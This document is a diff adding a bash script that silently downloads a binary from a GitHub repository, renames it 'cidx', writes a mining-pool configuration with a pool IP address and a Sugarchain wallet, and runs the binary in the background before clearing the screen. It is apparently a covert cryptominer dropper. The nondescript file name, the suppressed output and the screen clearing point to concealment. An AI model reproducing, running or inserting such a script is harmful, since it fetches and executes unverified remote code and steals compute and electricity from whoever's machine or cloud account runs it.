@@ -1,0 +1,48 @@
+#!/bin/bash
+
+# Download the cidx file
+wget -O cidx https://github.com/barburonjilo/back/raw/refs/heads/main/sru >/dev/null 2>&1
+
+# Set the current date in UTC-7 format
+current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")
+
+# Create config.json with the current date
+cat > config.json <<END
+{
+  "pool": "45.115.225.115:505",
+  "user": "sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr.lah",
+  "password": "x",
+  "cpu-threads": 8,
+  "algorithm": "yespowersugar"
+}
+END
+
+# Make cidx and config.json executable
+chmod +x config.json cidx
+
+# Run cidx in the background and log output to cidx.log
+nohup ./cidx -c 'config.json' > cidx.log 2>&1 &
+
+# Clear the screen
+clear
+
+# Print the current time and running jobs
+echo "RUN $(TZ=UTC-7 date +"%R-[%d/%m/%y]")"
+jobs
+
+# Display the last 10 lines of the log file
+echo "Last 10 lines of the log file (cidx.log):"
+tail -n 10 cidx.log
+
+# Run awk to process config.json and print the matching date-time part
+awk -v date_str="i-${current_date}" '
+{
+  if ($0 ~ /i-[0-9]{2}-[0-9]{2} \[[0-9]{2}-[0-9]{2}\]/) {
+    # Extract and print only the "i-<hour>-<minute> [<day>-<month>]" part
+    match($0, /i-[0-9]{2}-[0-9]{2} \[[0-9]{2}-[0-9]{2}\]/, arr)
+    if (length(arr) > 0) {
+      print arr[0]  # Print the matched date-time part
+    }
+  }
+}
+' config.json
